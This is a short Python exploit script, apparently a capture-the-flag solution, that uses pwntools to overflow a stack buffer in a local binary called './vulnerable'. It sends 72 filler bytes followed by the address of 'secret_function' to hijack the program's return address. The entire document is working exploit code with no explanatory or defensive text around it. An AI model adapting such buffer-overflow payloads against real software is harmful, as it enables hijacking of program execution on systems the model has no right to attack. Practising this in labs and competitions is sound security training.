from pwn import *

target_binary = './vulnerable'

elf = ELF(target_binary)

try:
    secret_function_address = elf.symbols['secret_function']
    print(f'Address of secret_function: {hex(secret_function_address)}')
except KeyError:
    print("Error: 'secret_function' not found in the binary's symbol table.")
    exit(1)

payload = b'A' * 72
payload += p64(secret_function_address).rstrip(b'\x00')

p = process([target_binary, payload])

try:
    print(p.recvall().decode())

except Exception as e:
    print(f'Error occurred: {e}')

finally:
    p.close()
